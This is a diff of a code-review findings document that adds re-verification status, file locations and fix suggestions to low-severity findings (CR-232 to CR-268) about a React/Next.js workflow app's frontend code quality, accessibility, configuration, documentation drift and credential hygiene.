 - **Area:** Area 5 — Flow runtime UI
@@ -5163,6 +6101,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-232 [Low] Duplicated types and transport helpers drift from their sources
+
+- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** components/flows/workflow-graph/NodeCard.tsx:11-17; components/flows/cockpit/fanout-progress.ts:20-26; components/flows/panels/ReviewView.tsx:17-22; hooks/use-flow-comments.ts:8-19; hooks/use-flow-prompt.ts:53-57,138-151; components/flows/panels/CostChip.tsx:19-31
+- **Re-verification note:** `FanoutProgress` is still defined twice, and ReviewView still re-declares `Comment` instead of importing `MrComment`. `use-flow-prompt` still hand-rolls `fetch` (the `fetchPromptData` path throws a bare `HTTP <status>` and drops the server's `{ error }`). CostChip still duplicates `fmtDuration`/`fmtTokens` from `lib/format.ts` as `fmtDur`/`fmtTok`. Fix: import the single sources, and use `fetchJson`/`postJson`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5182,6 +6124,10 @@ Original findings, verbatim:
 
 ### CR-233 [Low] WorkflowGraph re-runs the dagre layout on every render (every poll and selection click)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md)
+- **Current location:** components/flows/workflow-graph/WorkflowGraph.tsx:37-58; components/flows/workflow-graph/graph-layout.ts:34-37; components/flows/workflow-graph/GraphEdges.tsx:51-52,84,92
+- **Re-verification note:** `layout(keys, edges)` still rebuilds the dagre graph on every render (every poll and selection click), `keys.includes` inside the edge loop is O(n²), and `specOf` does a linear `find` per edge, twice. React Compiler is not enabled. Fix: `useMemo` the layout on a stable signature placed before the early returns (hooks order), use a `Set` for keys, and pre-index `edgeSpecs`.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 5 — Flow runtime UI
@@ -5200,6 +6146,10 @@ Original findings, verbatim:
 
 ### CR-234 [Low] Sub-flow navigation uses a raw `<a href>`, causing a full page reload and dropping the query cache
 
+- **Status at `abaa007`:** **Open**, fix in [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md)
+- **Current location:** components/flows/panels/FanoutStepList.tsx:161-169
+- **Re-verification note:** "Open sub-flow" is still a raw `<a href>` to an internal route, so each click does a full reload and drops the TanStack cache. Fix: use `next/link` (`<Link href=…>` or `Button render={<Link/>}` as FlowHeader does).
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 5 — Flow runtime UI
@@ -5216,6 +6166,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-235 [Low] Cockpit selection reads a ref during render to decide what's shown
+
+- **Status at `abaa007`:** **Open**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/cockpit/FlowCockpit.tsx:52-58
+- **Re-verification note:** `userSelected` ref is still read during render (`resolvedSelectedKey = userSelected.current ? selected : flow.current_node ?? ''`) and set inside `onSelect`. Derive `resolvedSelectedKey = selected || flow.current_node || ''`, drop the ref, and pass `setSelected` as `onSelect`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5234,6 +6188,10 @@ Original findings, verbatim:
 
 ### CR-236 [Low] Inline callbacks created inside `.map()` bodies
 
+- **Status at `abaa007`:** **Open**, fix in [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md)
+- **Current location:** components/flows/panels/StartView.tsx:87, components/flows/panels/BuildView.tsx:165, components/flows/panels/DecisionView.tsx:94, components/flows/panels/FanoutStepList.tsx:116-172 (closures at 143,148,157), components/flows/panels/ArtifactViews.tsx:76, components/flows/components/plan/components/PlanApproveFooter.tsx:74, components/chat/prompt-modal/PromptEditorSection.tsx:35
+- **Re-verification note:** Closures are still created inside `.map()` bodies; the plan footer moved to components/flows/components/plan/components/ but kept the pattern. FanoutStepList's ~55-line inline step card is the main target. Extract `FanoutStepCard` / `BranchMrRow` (and similar) rows that take primitives and a stable `(id) => void`, as `PlanStepItem` / `PlanStepDraftRow` already do.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 5 — Flow runtime UI
@@ -5250,6 +6208,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-237 [Low] Layout autosave shows "saved" on HTTP errors
+
+- **Status at `abaa007`:** **Open**, fix in [Task 15](review-tasks/15-frontend-mutation-conventions.md)
+- **Current location:** components/template-editor/hooks/use-node-positions.ts:17,61-67
+- **Re-verification note:** The positions PATCH still does `.then(() => setLayoutSync("saved"))` regardless of `res.ok`, and network errors fall back silently to "idle". Add an "error" `LayoutSync` state set when `!r.ok` or on catch, render it in `EditorHeader`, and preferably move the PATCH to a `useMutation`.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -5268,6 +6230,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-238 [Low] Duplicated domain magic strings and kind unions
+
+- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** components/template-editor/components/BuilderFlow.tsx:32, components/template-editor/WebhookPayloadDialog.tsx:37, components/template-editor/hooks/use-palette-catalog.ts:15,20,64, components/template-editor/hooks/use-configurator-tabs.ts:26, components/template-editor/types.ts:162, components/template-editor/NodePalette.tsx:122, components/builder/hooks/use-editor-actions.ts:35,223,347, components/builder/EditorCanvas.tsx:46, components/template-editor/boilerplate.ts:12, components/templates/constants.ts:8,16, components/template-editor/components/ConfigTab.tsx:31, components/template-editor/DeclarativeConfigFields.tsx:97
+- **Re-verification note:** `START_NODE_TEMPLATE_ID` is still redeclared locally in BuilderFlow and WebhookPayloadDialog, and `"nt_start"` is inlined twice more, even though draft.ts:32 exports it. `"nt_plan"`, `"start"` and `"decision"` are still raw literals, and the agent/decision/http/script union is declared four times (`DraftKind`, `AuthorKind`, `NodeTemplateKind`, the EditorCanvas inline union). The fanout key set is duplicated in ConfigTab and DeclarativeConfigFields. Add a shared `NODE_KIND` `as const` object, a `NodeKind` type and `BUILTIN_TEMPLATE_ID` constants, then import them everywhere.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5290,6 +6256,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-239 [Low] Oversized files and files exporting multiple components
+
+- **Status at `abaa007`:** **Open**, fix in [Task 54](review-tasks/54-feature-layout-and-naming.md)
+- **Current location:** components/builder/hooks/use-editor-actions.ts (447 lines), components/template-editor/variables.ts (417), components/template-editor/WebhookPayloadDialog.tsx (403, no "use client"), components/builder/EditorPage.tsx (301), components/template-editor/types.ts (232), components/templates/TemplateGallery.tsx (231), components/template-editor/NodeConfigurator.tsx:25-26 (229), components/template-editor/ConfigFieldRow.tsx (211), components/builder/EditorNodeDrawer.tsx:138, components/builder/EditorEdgeDrawer.tsx:25, components/template-editor/components/EdgeKindField.tsx:13, components/template-editor/PromptSectionField.tsx:45
+- **Re-verification note:** Every listed file still has the same line count. `SheetFooterHelper` is still a second export of EditorNodeDrawer and is consumed by EditorEdgeDrawer. NodeConfigurator still re-exports `SelectOption` and `StartContractEditor`, EdgeKindField imports `SelectOption` through it, and PromptSectionField re-exports `RulesListEditor`. Split use-editor-actions and WebhookPayloadDialog (and add "use client" to the dialog), move `SheetFooterHelper` to components/shared/, and replace the re-exports with direct imports.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5331,6 +6301,10 @@ Original findings, verbatim:
 
 ### CR-240 [Low] Accessibility gaps: div-click node card, icon-only buttons without labels, tabs without ARIA
 
+- **Status at `abaa007`:** **Open**, fix in [Task 38](review-tasks/38-editor-draft-machine.md)
+- **Current location:** components/template-editor/components/BuilderNodeView.tsx:41-57, components/builder/EditorNotices.tsx:30-37, components/template-editor/NodeConfigurator.tsx:171-185
+- **Re-verification note:** The node card is still a `div onClick` with no role, tabIndex or key handler. The notice dismiss button is icon-only with `title` but no `aria-label`. The configurator tabs are still plain buttons with no tablist/tab roles and no `aria-selected`. Add role="button", tabIndex and an Enter/Space handler (or use a button), add `aria-label`, and switch to the shadcn `Tabs` primitive or the new `components/shared/TabStrip`.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 6 — Template authoring
@@ -5353,6 +6327,10 @@ Original findings, verbatim:
 
 ### CR-241 [Low] Prompt editor never syncs an externally changed value
 
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/hooks/use-prompt-editor.ts:85-118, components/template-editor/PromptEditor.tsx:59
+- **Re-verification note:** `useEditor` is still seeded once with `content: textToHtml(value)`, and nothing calls `setContent` when `value` changes from outside (the only effect only re-dispatches decorations). Add an effect that calls `editor.commands.setContent` when `value` differs from the last emitted text, or key `PromptEditor` by node and field.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -5368,6 +6346,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-242 [Low] Schedule interval input can't be cleared or retyped
+
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/FlowSettings.tsx:113,118, components/template-editor/components/FlowSettingsSchedule.tsx:76-89
+- **Re-verification note:** `intervalMin={Number(trigger.interval_min ?? 60)}` still snaps an empty input back to 60, because the onChange handler emits `undefined` for non-positive values. Keep a local string buffer in the input, commit only valid positive numbers on change or blur, and show a validation hint when the field is empty.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -5388,6 +6370,10 @@ Original findings, verbatim:
 
 ### CR-243 [Low] `components/ui/modal.tsx` is a custom wrapper inside the shadcn-only folder
 
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** components/ui/modal.tsx:1-72 (import at :10, "Radix" comment at :12-15); consumers components/tasks/BuildModal.tsx, components/settings/integrations/components/ConnectModal.tsx, components/settings/repos/components/RepoModal.tsx, components/settings/general/components/SecretModal.tsx, components/chat/prompt-modal/PromptModal.tsx
+- **Re-verification note:** The custom `Modal` adapter, which preserves the old hand-rolled API, still lives in the shadcn-only `components/ui/` folder, still imports `../../lib/utils` (the ui lint rule blocks `@/lib/**` but not relative paths), and still says "Radix". Move it to components/shared/Modal.tsx, export it from the shared barrel, update the 5 importers, and fix the import and comment.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5406,6 +6392,10 @@ Original findings, verbatim:
 
 ### CR-244 [Low] Sidebar active state uses exact pathname match, so nested routes highlight nothing
 
+- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
+- **Current location:** components/shared/AppSidebar.tsx:81
+- **Re-verification note:** `const active = pathname === nav.pathname` is unchanged, so on detail routes (for example /flows/<id> or /templates/<id>) no sidebar item is highlighted. Use longest-prefix matching (`pathname === href || pathname.startsWith(href + "/")`, picking the most specific match), with `/` special-cased.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5420,6 +6410,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-245 [Low] `components/shared` holds app-specific code (sidebar nav routes, "Search tasks…" default)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
+- **Current location:** components/shared/AppSidebar.tsx:35-53,70,99, components/shared/FilterPicker.tsx:98, app/(workspace)/page.tsx:38
+- **Re-verification note:** AppSidebar still hardcodes the DevFlow route table, product name and "Local workspace" inside `components/shared/`, and FilterPicker still defaults its placeholder to "Search tasks…". Move AppSidebar to an app-shell folder (for example components/layout/) with routes in constants/routes.ts, reuse those route constants in links, and give FilterPicker a neutral default.
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -5437,6 +6431,10 @@ Original findings, verbatim:
 
 ### CR-246 [Low] Execution-mode values are raw literals with no shared constant; the `ExecutionMode` name collides
 
+- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** types/tasks.ts:10, components/tasks/hooks/use-start-build.ts:27, components/tasks/BuildModal.tsx:163,166, components/settings/general/constants.ts:7-10, components/flows/constants.ts:4, components/flows/components/plan/constants/index.ts:7-11
+- **Re-verification note:** `"cloud"` and `"local"` are still compared and rendered as raw literals, and the only constant is still the feature-local `EXECUTION_MODE_LOCAL`. The plan feature's `ExecutionMode` (whole/steps), now in components/flows/components/plan/constants, still collides by name with `types/tasks.ts` `ExecutionMode`. Add constants/execution.ts with `RUN_MODE` and `RunMode`, replace the literals, and rename one of the two types.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5453,6 +6451,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-247 [Low] Magic domain strings in tasks filters and integration tabs
+
+- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** components/tasks/TasksView.tsx:47,67-79, components/tasks/hooks/use-live-tasks.ts:12,15, components/settings/integrations/GitTab.tsx:28-29,44, components/settings/integrations/TaskTab.tsx:28-29,44, components/settings/integrations/HarnessTab.tsx:71,73, components/settings/general/components/StatusBar.tsx:18-19
+- **Re-verification note:** The filter keys and values (assignee, me, any, provider, statusCategory), the hosting values (cloud, custom), the Cursor card id and URL, and StatusBar's `.gitlab` / `.jira` lookups are all still literals, even though `PROVIDER_KIND` exists. Add `TASK_FILTER` / `ASSIGNEE` and `HOSTING` constants, use `PROVIDER_KIND` in StatusBar, and hoist the Cursor card constants.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5479,6 +6481,10 @@ Original findings, verbatim:
 
 ### CR-248 [Low] GitTab / TaskTab are near-duplicates, and three identical modal chromes exist
 
+- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
+- **Current location:** components/settings/integrations/GitTab.tsx:32-105 (166 lines), components/settings/integrations/TaskTab.tsx:32-104 (173 lines), components/settings/integrations/components/ConnectModal.tsx:10-39, components/settings/repos/components/RepoModal.tsx:10-40, components/settings/general/components/SecretModal.tsx:10-40
+- **Re-verification note:** GitTab and TaskTab are still near-duplicates in hook wiring, list, test/remove and submit logic, and the three modal chromes still repeat the same Cancel + submit footer. There is no `FormModal` yet. Add components/shared/FormModal.tsx (props for icon, submitLabel and width) and a shared `InstanceList` container, so each tab supplies only its form fields.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5496,6 +6502,10 @@ Original findings, verbatim:
 
 ### CR-249 [Low] Callbacks created inside `.map()` for row components
 
+- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
+- **Current location:** components/settings/repos/ReposSection.tsx:81-89, components/settings/integrations/GitTab.tsx:99-101, components/settings/integrations/TaskTab.tsx:98-100, components/settings/integrations/HarnessTab.tsx:76
+- **Re-verification note:** Row callbacks (`onEdit={() => openEdit(r)}`, `onTest={() => runTest(i.id)}`, `onDelete={() => remove.mutate(i.id)}`) are still created inside `.map()`. Pass the id plus stable `onEdit(id)` / `onDelete(id)` / `onTest(id)` handlers and bind them inside the row, following CustomNodesSection.tsx:111-112 / SecretRow.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5512,6 +6522,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-250 [Low] Unlabeled form controls in settings and the shared FilterPicker
+
+- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
+- **Current location:** components/settings/general/components/HttpAllowlist.tsx:23-30, components/settings/general/components/ModeCascade.tsx:33-37, components/settings/general/components/DefaultModelFields.tsx:21-25, components/settings/integrations/GitTab.tsx:115-124, components/settings/integrations/TaskTab.tsx:114-123, components/settings/integrations/HarnessTab.tsx:100-107, components/shared/FilterPicker.tsx:95-100
+- **Re-verification note:** Labels are still plain `<div>`s, or a `FieldLabel` without `htmlFor` next to a `SelectTrigger` with no `id` (ProviderSelect / HostingSelect take no id prop), and the FilterPicker input has only a placeholder. Use `<FieldLabel htmlFor>` with matching ids threaded through the selects, and add `aria-label` to the FilterPicker input.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5532,6 +6546,10 @@ Original findings, verbatim:
 
 ### CR-251 [Low] `Markdown` memo comparator ignores every prop except `children`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** components/shared/Markdown.tsx:136-150
+- **Re-verification note:** `React.memo(..., (prev, next) => prev.children === next.children)` still ignores changes to `className`, `id` and handlers. Drop the custom comparator so the default shallow compare applies, or compare `children` and `className` as well.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5551,6 +6569,10 @@ Original findings, verbatim:
 
 ### CR-252 [Low] `DataTable.tsx` is 436 lines with three components
 
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** components/shared/DataTable.tsx:84-335,338-415,419-436
+- **Re-verification note:** The file is still 436 lines and still defines `DataTable`, `ActionsCell` and a hand-rolled `ChevronsUpDown`. Split it into a components/shared/dataTable/ folder (DataTable, ActionsCell, pagination, skeleton rows, TreeCell; the folder name is lowercase per §2.9) and use lucide's `ChevronsUpDown`.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5567,6 +6589,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-253 [Low] Task badges: `target="_blank"` without `rel`, and regex if-chains instead of lookup tables
+
+- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** components/tasks/TaskBadges.tsx:17-31,34-41,54-78 (also components/flows/panels/BuildView.tsx:155)
+- **Re-verification note:** The provider link still has `target="_blank"` with no `rel="noopener noreferrer"`, the same gap exists on the BuildView MR link, and type, status and priority styling are still if/regex ternary chains in a file exporting three components. Add `rel`, move the `[pattern, className]` tables into components/tasks/constants.ts, and split the three badges into separate files.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5588,6 +6614,10 @@ Original findings, verbatim:
 
 ### CR-254 [Low] Webhook secrets are part of the client payload types (Needs verification)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
+- **Current location:** lib/engine/flow-engine.ts:480, types/flow.ts:115, components/flows/panels/PanelShell.tsx:107-127, types/template-editor.ts:69
+- **Re-verification note:** Verified: the flow snapshot (`hooks: hookStore.hooksForFlow(id)`, including `secret`) is polled into every cockpit view. The cockpit uses it: `WaitBanner` prints `hook.secret` in plain text and embeds it in the copied curl. The "drop if unused" option is therefore out. Instead, return a masked secret in the snapshot and add a separate reveal or copy endpoint that the banner calls on demand.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5606,6 +6636,10 @@ Original findings, verbatim:
 
 ### CR-255 [Low] SettingsProvider fetches unused git-hosts data and gates every sub-route on all three queries
 
+- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
+- **Current location:** components/settings/context.tsx:7,47,52,70-79,94,102,106, components/settings/queries.ts:21,30
+- **Re-verification note:** `/api/git-hosts` is still fetched on every settings visit, though nothing outside context.tsx reads `hosts` or `reload` (grep-verified). `loading` still ORs all three `isPending`s, so every page waits for the slow `/api/settings` probe. Remove `hosts`, `reload` and `fetchGitHosts`, and replace the context with per-resource query hooks so each page waits only on its own data.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5622,6 +6656,10 @@ Original findings, verbatim:
 
 ### CR-256 [Low] `createInstance` returns `null` cast as `InstanceRow`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
+- **Current location:** components/settings/integrations/hooks/use-instances.ts:46-47
+- **Re-verification note:** `return body.instance ?? (null as unknown as InstanceRow)` is unchanged. Throw a typed error when `instance` is missing (per the §2.9 early-guard rule), or type the return as `InstanceRow | null`.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -5636,6 +6674,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-257 [Low] `eslint.ignoreDuringBuilds: true` means `next build` never lints
+
+- **Status at `abaa007`:** **Open**, fix in [Task 02](review-tasks/02-typecheck-and-build-gates.md)
+- **Current location:** next.config.mjs:9, AGENTS.md:11-27 (§0 Definition of Done, build-only check at :22)
+- **Re-verification note:** `eslint: { ignoreDuringBuilds: true }` is still set, and the DoD still lists only `npm run build`. The blocker is gone: lint now installs and runs with 0 errors (CR-039 is resolved). Remove `ignoreDuringBuilds`, or add `npm run lint` and `npm test` to the AGENTS.md DoD checklist.
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -5654,6 +6696,10 @@ Original findings, verbatim:
 
 ### CR-258 [Low] tsconfig strictness gaps: no `noUncheckedIndexedAccess` or `noImplicitOverride`; `.mjs` scripts are not type-checked
 
+- **Status at `abaa007`:** **Open**, fix in [Task 51](review-tasks/51-tsconfig-strictness.md)
+- **Current location:** tsconfig.json:2-20
+- **Re-verification note:** None of the flags are enabled, and `checkJs` is still off for scripts/*.mjs. Re-measured on the current tree: `noFallthroughCasesInSwitch` + `noImplicitReturns` add 0 new errors, `noImplicitOverride` adds ~41 (52 total vs an 11-error baseline), and `noUncheckedIndexedAccess` adds ~186 (197 total). Enable the free flags now, then `noImplicitOverride`, then plan the indexed-access burn-down.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 7b — Tooling & config
@@ -5671,6 +6717,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-259 [Low] Two competing `cn()` implementations are used side by side, and `components.json` is out of sync with both
+
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** package.json (deps `cn`, `clsx`, `tailwind-merge`), lib/utils.ts, components.json:15,20, components/ui/modal.tsx:10, components/shared/AppSidebar.tsx:15, components/shared/FilterPicker.tsx:17, components/tasks/TasksView.tsx, components/tasks/TaskBadges.tsx
+- **Re-verification note:** Two `cn` engines are still used side by side: 33 files import from the `cn` package and 33 from `@/lib/utils` (lib/utils is allowlisted for client code in eslint.config.mjs). components.json still points `utils` at `@/lib/utils` while the primitives use `cn`, and the `ai-elements` alias still targets a non-existent folder. Pick one implementation, codemod the imports, repoint components.json, drop the unused dependencies, and remove the alias (plus the lint allowlist entry if lib/utils is dropped).
 
 - **Severity:** Low
 - **Category:** Code quality (sources: TOOL-16: Code quality; UI-29: Boundaries)
@@ -5718,6 +6768,10 @@ Original findings, verbatim:
 
 ### CR-260 [Low] README is stale in several places (env keys, routes, paths, local-mode description)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 56](review-tasks/56-docs-refresh.md)
+- **Current location:** README.md:9-10,16,58-61,73-74,89,124-125,165,226,261,277
+- **Re-verification note:** The README still documents `CURSOR_API_KEY` / `JIRA_*` env keys (.env.example says credentials live in the DB), `/tasks/import`, `components/panels/`, the `GITLAB_BASE_URL/TOKEN` fallback, and a cursor-agent CLI description of local mode that contradicts line 277. It got worse: it now documents `npm run seed:demo`, `seed:demo:fanout`, `seed:custom` and their `:reset` variants, all removed from package.json. Rewrite the env table from .env.example, fix the paths and routes, unify local mode on the SDK, and document seeds as `node scripts/seed-*.mjs` (or restore the npm scripts).
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7b — Tooling & config
@@ -5745,6 +6799,10 @@ Original findings, verbatim:
 
 ### CR-261 [Low] AGENTS.md seed command variants don't match `package.json`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 56](review-tasks/56-docs-refresh.md)
+- **Current location:** AGENTS.md:17,32, package.json:5-12
+- **Re-verification note:** The mismatch has widened. AGENTS.md §0 still says `npm run seed:demo` (with variants) and §1 names `seed:demo:reset`, but package.json no longer defines any seed script, so the documented command fails. Update §0 to the real invocation (`node scripts/seed-*.mjs`, or re-add npm scripts), and reword §1 to cover every seed script with a reset mode.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7b — Tooling & config
@@ -5760,6 +6818,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-262 [Low] Seed scripts duplicate boilerplate and hand-replicate engine logic
+
+- **Status at `abaa007`:** **Open**, fix in [Task 06](review-tasks/06-db-path-and-seed-safety.md)
+- **Current location:** scripts/seed-demo-flow.mjs:30-35,151-195,227, scripts/seed-demo-fanout.mjs:41,64-66,128, scripts/seed-branch-refine-demo.mjs:42-47,158-159,270, scripts/seed-custom-flow.mjs:37-42,65, scripts/seed-split-smoke.mjs:50,68, scripts/lib/seed-db.mjs
+- **Re-verification note:** All seed scripts now share only `resolveSeedDb` from scripts/lib/seed-db.mjs. Each still re-declares the WAL/schema bootstrap, `now` / `minsAgo` / `uid` and `reset()`. seed-demo-flow still carries engine replicas of `syncStepsFromPlan` / `markStepsDone` and a hand-copied `createFlow` INSERT, and seed-branch-refine-demo replicates `mergeBranchRefine` from plan-node. Move the shared helpers into scripts/lib/seed-db.mjs, and long term seed through the real `PlanStepStore` / `FlowEngine` APIs (for example as TS scripts or vitest fixtures) instead of replicas.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5779,6 +6841,9 @@ Original findings, verbatim:
 
 ### CR-263 [Low] `sentry-triage.yaml` declares `trigger.type: webhook`, which import silently coerces to `manual`
 
+- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 07](review-tasks/07-remove-dead-and-legacy-code.md)
+- **Re-verification note:** This only concerns a fixture written in a legacy data shape (flow `trigger.type: webhook`, removed from `FLOW_TRIGGER_TYPES` in lib/engine/constants/triggers.ts:8) and the silent legacy coercion to "manual" in lib/engine/templates/template-store.ts:922-923. Both still exist. Possible delete-legacy cleanup: switch docs/flow-templates/sentry-triage.yaml:4-11 to `type: manual` and make unknown trigger types an import error instead of coercing them.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7b — Tooling & config
@@ -5796,6 +6861,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-264 [Low] Local `.env` holds live integration secrets the app no longer reads
+
+- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
+- **Current location:** .env:3,6-8,11-12 (gitignored, never committed)
+- **Re-verification note:** The local .env still defines `CURSOR_API_KEY`, `JIRA_BASE_URL`, `JIRA_EMAIL`, `JIRA_API_TOKEN`, `GITLAB_BASE_URL` and `GITLAB_TOKEN` (values not printed). No code in lib/, app/ or scripts/ reads them; cursorSdk always passes the DB `apiKey`. The @cursor/sdk env fallback still makes the stray `CURSOR_API_KEY` a latent risk. Remove these keys once they are stored in Settings → Integrations, and rotate them if the file was ever shared.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -5815,6 +6884,10 @@ Original findings, verbatim:
 
 ### CR-265 [Low] `.gitignore` only ignores the literal `.env`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
+- **Current location:** .gitignore:3
+- **Re-verification note:** Only the literal `.env` is ignored, so `.env.local`, `.env.production`, `.env.*.local` and similar files could still be committed. Replace it with `.env*` plus `!.env.example`.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 7b — Tooling & config
@@ -5829,6 +6902,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-266 [Low] `package.json` has no `engines` field, even though local mode requires Node ≥ 22.13; the `shadcn` CLI is a runtime dependency
+
+- **Status at `abaa007`:** **Open**, fix in [Task 02](review-tasks/02-typecheck-and-build-gates.md)
+- **Current location:** package.json:13-48, .npmrc:1, app/globals.css:2, README.md:277
+- **Re-verification note:** There is still no `engines` field (Node >= 22.13 is required by @cursor/sdk local mode) and no `engine-strict` in .npmrc. `shadcn` (CLI, used only for the `shadcn/tailwind.css` import), `tailwindcss` and `@tailwindcss/postcss` are still runtime dependencies. Add `"engines": { "node": ">=22.13" }`, move build-only packages to devDependencies, or vendor the CSS.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5845,6 +6922,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-267 [Low] `check-worktrees.ts` leaks its temp workspace on failure
+
+- **Status at `abaa007`:** **Open**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
+- **Current location:** scripts/check-worktrees.ts:84,703-715
+- **Re-verification note:** The `mkdtemp` workspace is still removed only on the success path of `all()`, so any failure exits through `.catch` with the directory left behind. Wrap the body of `all()` in try/finally around `fs.rmSync(tmp, …)`, or port the check to vitest with `afterAll` cleanup.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5863,6 +6944,10 @@ Original findings, verbatim:
 
 ### CR-268 [Low] Design and plan docs reference files that no longer exist
 
+- **Status at `abaa007`:** **Open**, fix in [Task 56](review-tasks/56-docs-refresh.md)
+- **Current location:** docs/phase0-baseline.md, docs/pristine-plan.md, docs/tasks-plan.md, docs/custom-flows-plan.md, docs/worktree-support.md, docs/prompt-flow-fix-plan.md, docs/plan-conversation-refine.md, docs/node-definition-refactor-plan.md, docs/step-sub-flows-plan.md, docs/worktree-ensure-impl-plan.md, docs/worktree-ensure-runner.md, docs/refinement-plan.md, docs/template-editor-ux-plan.md, docs/prompt-flow-inconsistencies.md, eslint.config.mjs:38,92
